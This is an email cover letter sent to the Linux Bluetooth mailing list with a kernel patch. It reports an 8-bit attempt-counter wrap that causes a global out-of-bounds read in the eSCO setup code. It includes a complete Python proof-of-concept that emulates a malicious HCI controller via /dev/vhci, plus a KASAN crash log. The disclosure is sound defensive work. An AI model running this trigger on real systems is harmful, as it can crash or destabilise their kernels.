Received: from mail-pz2-f43.google.com (mail-pz2-f43.google.com [74.125.228.43])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 198352FD7C3
	for <linux-bluetooth@vger.kernel.org>; Sat, 12 Sep 2026 13:45:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.43
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789220713; cv=none; b=ole5xohQg35CWFyTao5AN2H6FzROIakSxy4Ko2bBPeZ9/cvTOtMCaLy6HWjVjgToIDzPR8/y3lX/RKa05W0EniQbZ8/EqAVR/iCVL+J5ev64LHbvq7b+XOXh4ddo4nU1yoLRhI2+da1Fl+mwdX2SggbC0Wzt/CYTT11VIUCkNrw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789220713; c=relaxed/simple;
	bh=zDunJ8YfR0u+i51qt5yyD6sh34uYN9PwZVZZPoEz4p8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=T2nUTld8sEgpoZeQB27h8QnQbj36Ehvm7gRc0CKtZKTVcuOKFiso2+uzBkZkYqsjPIH+uQCTCRLQkXGSq+DFp2CQj8PeR26BOpY47uTnUWrldAKphxQC3TZXAQ2S5znJNy9tohIb0jk3sVgAtdddUPpPgFjpnTyBuTvBl/W1Vwc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LZwe7gj8; arc=none smtp.client-ip=74.125.228.43
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LZwe7gj8"
Received: by mail-pz2-f43.google.com with SMTP id d2e1a72fcca58-8625b35e11eso415751b3a.0
        for <linux-bluetooth@vger.kernel.org>; Sat, 12 Sep 2026 06:45:11 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789220711; x=1789825511; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DkpRA03pVDmKa/7EjkKRhW33WGGO4svMRp0yJ63WryM=;
        b=LZwe7gj8e6QXcPXRW8sE1lR8HSp7FKsUDb0wYsGo/pRuoOliD5BIR6agMqVvr8Ns8Y
         ofLy9gVggp32LvxZRCJMVQ5IC1vgyyWCR16v+EOliJ4OxiR620KT9YUA96MSgTRtMB34
         BmWeypTEFwk42v+QRH47mAB9JL4Lty/3V6SgkdCTxNiL5oEuEZEMwyllJ3pqkEQbYhGc
         dNq9pxnyH55tQCLwE6fLuGD7thtC8f/TcHFTSMjQ2icifQVUbVs2Ov1OY8y5F3ABf7lH
         0Kb4l75QcM5ZdAvZNLwXYAkiyT6Srt7mRggUGaVnSv9JbWo9cpAbpMsjbydDwGIPtvVv
         brlg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789220711; x=1789825511;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DkpRA03pVDmKa/7EjkKRhW33WGGO4svMRp0yJ63WryM=;
        b=QNCOx4XlJjL5bsOgH6rNly598SGmWQZdb3keouNnZWUHx0vOMDS+ryyGZJRyrweXUm
         IDAj/mfJ1Mp9Y93dGMQA14VTdLoIhzNwh1+ovyVW3AZpYaNjR86LyTO/Y4Q+oVnJxIMb
         GRhPNsjUlbS1uYYr2DEdW4cgNKP6ViGgQS6QHdgH4fJ/XnmiMpvtHDdK/F1cZSt2nP+D
         Q26Ywl2A/SgNRu+Orp70Alb0vwOzM5p3d/a68Lnx9pc4qnvvOGvkCUXm14cSkoTlmuei
         ek89CcrqWbSip+ptW8HPM7/G1b2+/uDj51UpZiQ8Ag2Xkn9+DA+CraZXzv3365erdRS0
         pWFA==
X-Gm-Message-State: AFuF++m1gcerXKhQMKya48fqd8mF0IshEKGtxs2jrbxTguBH4JMxhuwQ
	TGJg6edzxwFNfszzTATaT2DKSf/iQh/OP7i6VQ6mQFKOYqB6Ot3v1Z3z44Ook1bB6R4jvMcjL5D
	9719bdFhXn+Y=
X-Gm-Gg: AYBFou3HM+gLohttlpBA40NWoDLL5y3C4Q5Irhs8imFWTQOJ8pV0GiXVRVNLReaAabG
	WouERoNKSKnOE5A8K+qmNdHQa6XGMVhIW4of4RbTeMzvzNyncJhPmCdTEMcgWDNKMvCu/SoGQan
	DkLzorP2To1dd86G2BH2L+UpxvK4PzAUz64hnZ2ch1poNpBvR1huFuQIAkeASBKBFtQC9HVU4/D
	fIGWT13bMH+8zTtotjE3jM46A8+FQdc4hAJEF6X0yAEueRiQDUdkzWRXj8CaCMkmcBfX4MfEyF5
	tRxMNu+lH6PTGv3RWv2CBGaKziatJXVo/b4wkdR3wAAZqHrw2pczRWbzr7/6nXsMTm4nqwfKmT1
	EdtnObo+/9zjXtXyYGJWV1GtxIAVGOFCCs5Cfr4B1qCDBqJvceEuhpfwOUUQgfqzvsM1/0saGIX
	GKzcs9SVLFLaDTVfgt1Uej2o/CYQ8nYVGmoGVPaF3AYyZnMb4Bh5AVT98iDHGHp4feZiWM5XT7/
	ZLGIfc=
X-Received: by 2002:a05:6a21:9203:b0:3c4:46ca:334b with SMTP id adf61e73a8af0-3db0e150515mr5999428637.9.1789220711231;
        Sat, 12 Sep 2026 06:45:11 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4f7390csm14006314eec.26.2026.09.12.06.45.08
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 12 Sep 2026 06:45:10 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-bluetooth@vger.kernel.org
Cc: marcel@holtmann.org,
	luiz.dentz@gmail.com,
	chethan.tumkur.narayan@intel.com,
	ravishankar.srivatsa@intel.com,
	kiran.k@intel.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] Bluetooth: prevent wrapped eSCO connection attempts
Date: Sat, 12 Sep 2026 21:44:59 +0800
Message-ID: <cover.1789220439.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/bluetooth/hci_conn.c. The bug is
reachable by a root user using a malicious HCI controller through
/dev/vhci.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

hci_conn::attempt is an 8-bit counter. Repeated synchronous-connection
failure events queue more enhanced setup work while the connection stays
alive. The counter can wrap from 255 to zero.

find_next_esco_param() indexes the parameter table with
attempt - 1. After the wrap, this becomes an index before the static
table and produces a global out-of-bounds read. The wrapped value can
also be used when constructing the next enhanced synchronous-connection
command.

The fix rejects a zero attempt before the table lookup and immediately
after incrementing the counter in hci_enhanced_setup_sync().

Reproducer:

    sysctl -w kernel.panic_on_warn=0
    sh /root/poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    python3 -u - <<'PY'
    import os
    import socket
    import struct
    import subprocess
    import threading
    import time
    import ctypes
    import ctypes.util

    VHCI = "/dev/vhci"
    BDADDR_BYTES = bytes.fromhex("060504030201")
    BDADDR_STR = "01:02:03:04:05:06"
    ACL_HANDLE = 0x0042
    SYNC_STATUS = 0x1F

    CMD_RESET = 0x0C03
    CMD_READ_LOCAL_VERSION = 0x1001
    CMD_READ_LOCAL_COMMANDS = 0x1002
    CMD_READ_LOCAL_FEATURES = 0x1003
    CMD_READ_BUFFER_SIZE = 0x1005
    CMD_READ_BD_ADDR = 0x1009
    CMD_SET_EVENT_MASK = 0x0C01
    CMD_READ_LOCAL_NAME = 0x0C14
    CMD_WRITE_CA_TIMEOUT = 0x0C16
    CMD_READ_CLASS_OF_DEV = 0x0C23
    CMD_READ_VOICE_SETTING = 0x0C25
    CMD_READ_NUM_SUPPORTED_IAC = 0x0C38
    CMD_READ_CURRENT_IAC_LAP = 0x0C39
    CMD_READ_INQ_RSP_TX_POWER = 0x0C46
    CMD_CREATE_CONN = 0x0405
    CMD_REMOTE_NAME_REQ = 0x0419
    CMD_READ_REMOTE_FEATURES = 0x041B
    CMD_SETUP_SYNC_CONN = 0x0428
    CMD_ENHANCED_SETUP_SYNC_CONN = 0x043D
    CMD_LE_READ_ACCEPT_LIST_SIZE = 0x080F

    EVT_CMD_COMPLETE = 0x0E
    EVT_CMD_STATUS = 0x0F
    EVT_CONN_COMPLETE = 0x03
    EVT_REMOTE_NAME = 0x07
    EVT_REMOTE_FEATURES = 0x0B
    EVT_SYNC_CONN_COMPLETE = 0x2C


    def log(*args):
        print(*args, flush=True)


    fd = os.open(VHCI, os.O_RDWR)
    os.write(fd, b"\xff\x00")
    log("created vhci controller")

    state = {
        "conn_complete_sent": False,
        "sync_spam_sent": False,
    }


    def send_event(evt, payload):
        packet = bytes([0x04, evt, len(payload)]) + payload
        os.write(fd, packet)


    def cmd_complete(opcode, retparams):
        send_event(EVT_CMD_COMPLETE, bytes([1]) + struct.pack("<H", opcode) + retparams)


    def cmd_status(opcode, status=0):
        send_event(EVT_CMD_STATUS, bytes([status, 1]) + struct.pack("<H", opcode))


    def send_conn_complete(status=0):
        payload = (
            bytes([status])
            + struct.pack("<H", ACL_HANDLE)
            + BDADDR_BYTES
            + bytes([0x01, 0x00])
        )
        send_event(EVT_CONN_COMPLETE, payload)
        log("sent ACL conn complete", hex(status))


    def send_remote_features(status=0):
        payload = bytes([status]) + struct.pack("<H", ACL_HANDLE) + (b"\x00" * 8)
        send_event(EVT_REMOTE_FEATURES, payload)
        log("sent remote features", hex(status))


    def send_remote_name(status=0):
        name = b"vhci-remote"
        payload = bytes([status]) + BDADDR_BYTES + name + (b"\x00" * (248 - len(name)))
        send_event(EVT_REMOTE_NAME, payload)
        log("sent remote name", hex(status))


    def spam_sync_failures():
        # The first enhanced setup uses attempt=2 because the remote features are
        # still all zero at this point; 254 more queued retries are enough to wrap
        # the u8 counter back to zero inside hci_enhanced_setup_sync().
        time.sleep(0.05)
        payload = (
            bytes([SYNC_STATUS])
            + struct.pack("<H", 0)
            + BDADDR_BYTES
            + bytes([0x02, 0x00, 0x00])
            + struct.pack("<H", 0)
            + struct.pack("<H", 0)
            + bytes([0x00])
        )
        for _ in range(300):
            send_event(EVT_SYNC_CONN_COMPLETE, payload)
        log("sent 300 synchronous-connection failure events")


    def handle_command(opcode, params):
        if opcode == CMD_RESET:
            cmd_complete(opcode, b"\x00")
            return

        if opcode == CMD_READ_LOCAL_FEATURES:
            features = bytearray(8)
            features[2] |= 0x08  # LMP_TRANSPARENT
            features[3] |= 0x80  # LMP_ESCO
            cmd_complete(opcode, b"\x00" + bytes(features))
            return

        if opcode == CMD_READ_LOCAL_VERSION:
            reply = struct.pack("<BBHBHH", 0x00, 0x09, 0x0000, 0x09, 0x0000, 0x0000)
            cmd_complete(opcode, reply)
            return

        if opcode == CMD_READ_LOCAL_COMMANDS:
            commands = bytearray(64)
            commands[1] |= 0x20  # Reset
            commands[5] |= 0x10  # Create Connection
            commands[6] |= 0x10  # Read Local Name
            commands[8] |= 0x20  # Read Local Version
            commands[8] |= 0x40  # Read Local Commands
            commands[8] |= 0x80  # Read Local Features
            commands[9] |= 0x04  # Read Voice Setting
            commands[10] |= 0x20  # Read Buffer Size
            commands[10] |= 0x80  # Read BD_ADDR
            commands[12] |= 0x02  # Read Class of Device
            commands[12] |= 0x08  # Read Voice Setting
            commands[12] |= 0x80  # Read Num Supported IAC
            commands[13] |= 0x01  # Read Current IAC LAP
            commands[16] |= 0x04  # Read Remote Features
            commands[29] |= 0x08  # Enhanced Setup Synchronous Connection
            cmd_complete(opcode, b"\x00" + bytes(commands))
            return

        if opcode == CMD_READ_BUFFER_SIZE:
            reply = struct.pack("<BHBHH", 0x00, 1021, 64, 8, 8)
            cmd_complete(opcode, reply)
            return

        if opcode == CMD_READ_BD_ADDR:
            cmd_complete(opcode, b"\x00" + bytes.fromhex("aabbccddeeff"))
            return

        if opcode == CMD_SET_EVENT_MASK:
            cmd_complete(opcode, b"\x00")
            return

        if opcode == CMD_READ_LOCAL_NAME:
            name = b"vhci-poc"
            cmd_complete(opcode, b"\x00" + name + (b"\x00" * (248 - len(name))))
            return

        if opcode == CMD_WRITE_CA_TIMEOUT:
            cmd_complete(opcode, b"\x00")
            return

        if opcode == CMD_READ_CLASS_OF_DEV:
            cmd_complete(opcode, b"\x00\x00\x00\x00")
            return

        if opcode == CMD_READ_VOICE_SETTING:
            cmd_complete(opcode, struct.pack("<BH", 0x00, 0x0060))
            return

        if opcode == CMD_READ_NUM_SUPPORTED_IAC:
            cmd_complete(opcode, b"\x00\x01")
            return

        if opcode == CMD_READ_CURRENT_IAC_LAP:
            cmd_complete(opcode, b"\x00\x01\x33\x8b\x9e")
            return

        if opcode == CMD_READ_INQ_RSP_TX_POWER:
            cmd_complete(opcode, b"\x00\x00")
            return

        if opcode == CMD_LE_READ_ACCEPT_LIST_SIZE:
            cmd_complete(opcode, b"\x00\x00")
            return

        if opcode == CMD_CREATE_CONN:
            log("saw HCI_OP_CREATE_CONN", params.hex())
            cmd_status(opcode, 0)
            if not state["conn_complete_sent"]:
                state["conn_complete_sent"] = True
                threading.Thread(
                    target=lambda: (time.sleep(0.05), send_conn_complete(0)),
                    daemon=True,
                ).start()
            return

        if opcode == CMD_READ_REMOTE_FEATURES:
            log("saw HCI_OP_READ_REMOTE_FEATURES")
            cmd_status(opcode, 0)
            threading.Thread(
                target=lambda: (time.sleep(0.02), send_remote_features(0)),
                daemon=True,
            ).start()
            return

        if opcode == CMD_REMOTE_NAME_REQ:
            log("saw HCI_OP_REMOTE_NAME_REQ")
            cmd_status(opcode, 0)
            threading.Thread(
                target=lambda: (time.sleep(0.02), send_remote_name(0)),
                daemon=True,
            ).start()
            return

        if opcode in (CMD_SETUP_SYNC_CONN, CMD_ENHANCED_SETUP_SYNC_CONN):
            log(f"saw sync setup opcode 0x{opcode:04x}", params.hex())
            cmd_status(opcode, 0)
            if not state["sync_spam_sent"]:
                state["sync_spam_sent"] = True
                threading.Thread(target=spam_sync_failures, daemon=True).start()
            return

        log(f"replying success to unexpected opcode 0x{opcode:04x}", params.hex())
        cmd_complete(opcode, b"\x00")


    def vhci_reader():
        while True:
            packet = os.read(fd, 4096)
            if not packet:
                log("vhci read EOF")
                return

            pkt_type = packet[0]
            if pkt_type != 0x01:
                log("RX non-command packet", packet.hex())
                continue

            opcode, plen = struct.unpack_from("<HB", packet, 1)
            params = packet[4 : 4 + plen]
            log(f"RX command opcode=0x{opcode:04x} len={plen}")
            handle_command(opcode, params)


    reader = threading.Thread(target=vhci_reader, daemon=True)
    reader.start()

    for _ in range(100):
        if os.path.exists("/sys/class/bluetooth/hci0"):
            break
        time.sleep(0.1)

    for attempt in range(5):
        rc = subprocess.call("hciconfig hci0 up", shell=True)
        log("hciconfig up rc", rc, "attempt", attempt)
        time.sleep(0.2)
        try:
            info = subprocess.check_output("hciconfig -a hci0 || true", shell=True, text=True)
        except Exception as exc:
            log("hciconfig query failed", repr(exc))
            info = ""
        if info:
            print(info, end="", flush=True)
        if "RUNNING" in info:
            break

    log("attempting SCO connect")
    sco = socket.socket(
        socket.AF_BLUETOOTH,
        socket.SOCK_SEQPACKET,
        getattr(socket, "BTPROTO_SCO", 2),
    )
    sco.setsockopt(getattr(socket, "SOL_BLUETOOTH", 274), 11, struct.pack("<H", 0x0003))


    class SockaddrSco(ctypes.Structure):
        _fields_ = [
            ("sco_family", ctypes.c_ushort),
            ("sco_bdaddr", ctypes.c_ubyte * 6),
        ]


    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    addr = SockaddrSco()
    addr.sco_family = socket.AF_BLUETOOTH
    for i, value in enumerate(BDADDR_BYTES):
        addr.sco_bdaddr[i] = value

    try:
        ret = libc.connect(
            sco.fileno(),
            ctypes.byref(addr),
            ctypes.sizeof(addr),
        )
        if ret != 0:
            err = ctypes.get_errno()
            raise OSError(err, os.strerror(err))
        log("connect returned")
    except Exception as exc:
        log("connect raised", repr(exc))

    while True:
        time.sleep(1)
    PY

------END poc.sh--------

----BEGIN crash log----

[  250.143377] [     T69] BUG: KASAN: global-out-of-bounds in find_next_esco_param.part.0+0x165/0x1c0
[  250.143612] [     T69] Read of size 2 at addr ffffffff8bc334da by task kworker/u17:0/69

[  250.143705] [     T69] CPU: 3 UID: 0 PID: 69 Comm: kworker/u17:0 Not tainted 6.12.95 #2
[  250.143717] [     T69] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  250.143729] [     T69] Workqueue: hci0 hci_cmd_sync_work
[  250.143844] [     T69] Call Trace:
[  250.143871] [     T69]  <TASK>
[  250.143883] [     T69]  dump_stack_lvl+0x78/0xe0
[  250.144003] [     T69]  print_report+0xc6/0x620
[  250.144144] [     T69]  ? find_next_esco_param.part.0+0x165/0x1c0
[  250.144177] [     T69]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.144233] [     T69]  ? __virt_addr_valid+0x1f3/0x3d0
[  250.144322] [     T69]  ? find_next_esco_param.part.0+0x165/0x1c0
[  250.144334] [     T69]  kasan_report+0xd8/0x110
[  250.144351] [     T69]  ? find_next_esco_param.part.0+0x165/0x1c0
[  250.144376] [     T69]  find_next_esco_param.part.0+0x165/0x1c0
[  250.144397] [     T69]  hci_enhanced_setup_sync+0x913/0xca0
[  250.144413] [     T69]  ? __pfx_hci_enhanced_setup_sync+0x10/0x10
[  250.144423] [     T69]  ? __pfx___mutex_lock+0x10/0x10
[  250.144487] [     T69]  ? __pfx___mutex_unlock_slowpath+0x10/0x10
[  250.144506] [     T69]  ? cfrfml_transmit+0xa0/0x650
[  250.144573] [     T69]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  250.144650] [     T69]  hci_cmd_sync_work+0x18d/0x3a0
[  250.144676] [     T69]  process_one_work+0x855/0x1ac0
[  250.144771] [     T69]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  250.144784] [     T69]  ? __pfx_process_one_work+0x10/0x10
[  250.144810] [     T69]  ? srso_alias_return_thunk+0x5/0xfbef5
[  250.144827] [     T69]  worker_thread+0x4f4/0xd60
[  250.144860] [     T69]  ? __pfx_worker_thread+0x10/0x10
[  250.144870] [     T69]  kthread+0x27e/0x350
[  250.144891] [     T69]  ? _raw_spin_unlock_irq+0x28/0x50
[  250.144902] [     T69]  ? __pfx_kthread+0x10/0x10
[  250.144914] [     T69]  ret_from_fork+0x31/0x70
[  250.144968] [     T69]  ? __pfx_kthread+0x10/0x10
[  250.144977] [     T69]  ret_from_fork_asm+0x1a/0x30
[  250.145053] [     T69]  </TASK>

[  250.145142] [     T69] The buggy address belongs to the variable:
[  250.145151] [     T69]  __func__.53+0x7a/0x80

[  250.145260] [     T69] The buggy address belongs to the physical page:
[  250.145283] [     T69] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xbc33
[  250.145312] [     T69] flags: 0xfff00000002000(reserved|node=0|zone=1|lastcpupid=0x7ff)
[  250.145354] [     T69] raw: 00fff00000002000 ffffea00002f0cc8 ffffea00002f0cc8 0000000000000000
[  250.145367] [     T69] raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000
[  250.145377] [     T69] page dumped because: kasan: bad access detected
[  250.145404] [     T69] page_owner info is not present (never set?)

[  250.146486] [     T69] Memory state around the buggy address:
[  250.146497] [     T69]  ffffffff8bc33380: f9 f9 f9 f9 00 00 05 f9 f9 f9 f9 f9 00 00 00 f9
[  250.146509] [     T69]  ffffffff8bc33400: f9 f9 f9 f9 00 07 f9 f9 f9 f9 f9 f9 00 06 f9 f9
[  250.146520] [     T69] >ffffffff8bc33480: f9 f9 f9 f9 00 02 f9 f9 f9 f9 f9 f9 00 04 f9 f9
[  250.146530] [     T69]                                                     ^
[  250.146542] [     T69]  ffffffff8bc33500: f9 f9 f9 f9 00 04 f9 f9 f9 f9 f9 f9 00 00 00 06
[  250.146572] [     T69]  ffffffff8bc33580: f9 f9 f9 f9 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9
[  250.146582] [     T69] ==================================================================

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  Bluetooth: prevent wrapped eSCO connection attempts

 net/bluetooth/hci_conn.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0

